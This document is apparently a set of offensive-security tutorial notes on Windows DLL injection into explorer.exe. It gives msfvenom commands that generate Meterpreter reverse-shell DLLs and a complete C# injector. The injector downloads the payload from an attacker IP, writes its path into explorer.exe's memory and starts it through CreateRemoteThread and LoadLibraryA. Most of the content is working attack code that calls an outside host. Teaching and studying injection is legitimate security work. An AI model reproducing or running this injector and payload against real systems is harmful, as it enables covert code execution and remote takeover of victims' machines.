## **DLL Injection Theory**

DLL Injection is the technique of forcing a remote process to load a malicious **Dynamic Link Library (DLL)** so that code executes inside that process‚Äôs address space.

---

## 1. DLL Loading Basics

Normally, a process loads a DLL using the **LoadLibrary** API:

```c
HMODULE LoadLibraryA(
  LPCSTR lpLibFileName
);
```

- **LoadLibraryA** ‚Üí ASCII version.
- **LoadLibraryW** ‚Üí Unicode version.
- Both load DLLs into the virtual memory of the calling process.

üîë **Problem:**

`LoadLibrary` cannot be directly called inside another (remote) process.

We must **force a remote process** (e.g., `explorer.exe`) to call `LoadLibrary` with our DLL‚Äôs path.

---

## 2. Injection via CreateRemoteThread

We can achieve this by using `CreateRemoteThread`:

- **4th argument** (`lpStartAddress`): function to execute ‚Üí `LoadLibraryA`‚Äôs address.
- **5th argument** (`lpParameter`): pointer to a string ‚Üí our DLL path.

**Steps:**

1. Get a handle to the remote process with `OpenProcess`.
2. Allocate memory in that process with `VirtualAllocEx`.
3. Write the DLL path string into allocated memory with `WriteProcessMemory`.
4. Call `CreateRemoteThread` with:
    - Start address = `LoadLibraryA`
    - Parameter = address of the DLL path buffer.

Result: The remote process loads our DLL ‚Üí executes its entry point.

---

## 3. Role of `DllMain`

Each DLL has an entry point `DllMain`:

```c
BOOL WINAPI DllMain(
  _In_ HINSTANCE hinstDLL,
  _In_ DWORD     fdwReason,
  _In_ LPVOID    lpvReserved
);

```

### `fdwReason` values:

- `DLL_PROCESS_ATTACH` ‚Üí DLL loaded into a process.
- `DLL_THREAD_ATTACH` ‚Üí new thread created.
- `DLL_THREAD_DETACH` ‚Üí thread exits.
- `DLL_PROCESS_DETACH` ‚Üí process unloads DLL.

**Malware trick:** Place shellcode inside the `DLL_PROCESS_ATTACH` case ‚Üí executed immediately after the DLL is loaded by `LoadLibrary`.

Example:

```c
BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

---

## 4. Restrictions & Considerations

1. **Managed vs. Unmanaged DLLs**
    - Managed DLLs (C#, .NET) cannot be injected into an unmanaged process.
    - Injection relies on `LoadLibrary`, which expects **native DLLs (C/C++)**.
2. **Exported APIs**
    - DLLs normally contain APIs that are called after the DLL is loaded.
    - Normally, DLLs expose functions accessed with `GetProcAddress`.
    - But since `GetProcAddress` cannot be used across process boundaries, malicious DLLs typically execute payload directly from `DllMain`.
3. **Target DLL format**
    - Must be an **unmanaged DLL** written in C/C++ or generated by a framework like **Metasploit‚Äôs msfvenom**.

---

## 5. Example: Generating a Malicious DLL

Using Metasploit:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o inject.dll
```

- Payload is embedded into DLL‚Äôs entry point.
- Inject this DLL into `explorer.exe` using the injection technique above.
- On load (`DLL_PROCESS_ATTACH`), payload executes and gives reverse shell.

---

## 6. Summary of Workflow

1. **OpenProcess** ‚Üí Get handle to target process.
2. **VirtualAllocEx** ‚Üí Allocate space for DLL path.
3. **WriteProcessMemory** ‚Üí Write DLL path into target.
4. **GetProcAddress(LoadLibraryA)** ‚Üí Resolve LoadLibraryA address.
5. **CreateRemoteThread** ‚Üí Start thread at LoadLibraryA with DLL path as parameter.
6. Target process executes malicious DLL‚Äôs `DllMain`.

---

## 7. Managed ‚Üî Unmanaged Compatibility

- ‚ùå **Managed DLL ‚Üí Unmanaged process**: Not possible.
    - Managed DLLs depend on the .NET CLR runtime, which unmanaged processes do not load automatically.
- ‚úÖ **Unmanaged DLL ‚Üí Managed process**: Possible.
    - Managed (.NET) processes are still standard Windows processes that can load unmanaged DLLs.
    - Example: A C# program can use `[DllImport]` (P/Invoke) to call functions in unmanaged DLLs like `kernel32.dll`.

üëâ So, while **unmanaged DLLs can be injected into both managed and unmanaged processes**, managed DLLs are limited to managed (.NET) environments only.

---

## 8. Key Takeaways

- DLL Injection relies on forcing a target to call **LoadLibrary**.
- The **payload is executed via `DllMain`**, usually at `DLL_PROCESS_ATTACH`.
- Only **unmanaged (native) DLLs** can be injected into arbitrary processes.
- Managed DLL injection into unmanaged processes is not feasible because no CLR is present.
- Tools like `msfvenom` simplify creation of malicious DLLs for injection.

## **DLL Injection with C#**

<img width="2628" height="3114" alt="_- visual selection" src="https://github.com/user-attachments/assets/74be5a47-a557-4088-81c3-e8141ebb020f" />

1. **Generating a Malicious DLL**
    
    We use **msfvenom** to create an unmanaged DLL payload:
    
    ```csharp
    	msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f dll -o met.dll
    ```
    
    This DLL contains the reverse shell payload in its **DllMain (DLL_PROCESS_ATTACH)** entry point.
    
2. **Create a new C# .NET Standard Console app** 
3. **Fetching the DLL in C#**
    
    Since `LoadLibrary` only accepts DLLs present on disk, our injector must first **download the DLL** and save it locally:
    
    ```csharp
    using System.Net;
    ...
    
    String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
    String dllName = dir + "\\met.dll";
    
    WebClient wc = new WebClient();
    wc.DownloadFile("http://192.168.119.120/met.dll", dllName);
    ```
    
    ‚úî Downloads the DLL to the **Documents** folder of the current user.
    
4. **Opening the Target Process**
    
    We select **explorer.exe** (a stable process always running under the user context):
    
    ```csharp
    Process[] expProc = Process.GetProcessesByName("explorer");
    int pid = expProc[0].Id;
    
    IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
    ```
    
    - `0x001F0FFF` ‚Üí Full access rights (PROCESS_ALL_ACCESS).
    - `hProcess` ‚Üí Handle to `explorer.exe`.
5.  **Allocating & Writing DLL Path into Remote Process**
    
    We allocate memory in the remote process with `VirtualAllocEx` and then write the DLL path into it:
    
    ```csharp
    IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
    
    IntPtr outSize;
    Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
    
    ```
    
    - `0x3000` ‚Üí `MEM_COMMIT | MEM_RESERVE` allocation.
    - `0x40` ‚Üí `PAGE_EXECUTE_READWRITE` memory protection.
    - `addr` ‚Üí Address of the DLL path in the remote process.
6. **Resolving LoadLibraryA**
    
    DLL injection relies on `LoadLibraryA` to load the DLL. We resolve its address from kernel32.dll:
    
    ```csharp
    IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    ```
    
    Since `kernel32.dll` is loaded at the same base address across all processes (ASLR exceptions aside), the address is valid in the remote process.
    
7. **Creating a Remote Thread**
    
    We finally instruct the target process to run `LoadLibraryA` with our DLL path as an argument:
    
    ```csharp
    IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
    ```
    
    - `loadLib` ‚Üí Start address (`LoadLibraryA`).
    - `addr` ‚Üí Parameter (DLL path string).
    - A new thread in `explorer.exe` loads our DLL ‚Üí triggers payload in its `DllMain`.
8. **Full Injector Code (C#)**
    
    ```csharp
    using System;
    using System.Diagnostics;
    using System.Net;
    using System.Runtime.InteropServices;
    using System.Text;
    
    namespace Inject
    {
        class Program
        {
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
            [DllImport("kernel32.dll")]
            static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    
            [DllImport("kernel32.dll")]
            static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
            [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
            static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
            [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
            public static extern IntPtr GetModuleHandle(string lpModuleName);
    
            static void Main(string[] args)
            {
    
                String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                String dllName = dir + "\\met.dll";
    
                WebClient wc = new WebClient();
                wc.DownloadFile("http://192.168.119.120/met.dll", dllName);
    
                Process[] expProc = Process.GetProcessesByName("explorer");
                int pid = expProc[0].Id;
    
                IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                IntPtr outSize;
                Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
                IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
            }
        }
    }
    
    ```
    

## Summary of Workflow

1. **Generate malicious DLL** ‚Üí with `msfvenom`.
2. **Download DLL** ‚Üí C# WebClient fetches DLL to disk.
3. **Open target process** ‚Üí `explorer.exe`.
4. **Allocate memory in remote process** ‚Üí `VirtualAllocEx`.
5. **Write DLL path** ‚Üí `WriteProcessMemory`.
6. **Get LoadLibraryA address** ‚Üí `GetProcAddress`.

7. **Create remote thread** ‚Üí `CreateRemoteThread` to load DLL.
8. **Payload executes** ‚Üí via `DllMain (DLL_PROCESS_ATTACH)`.
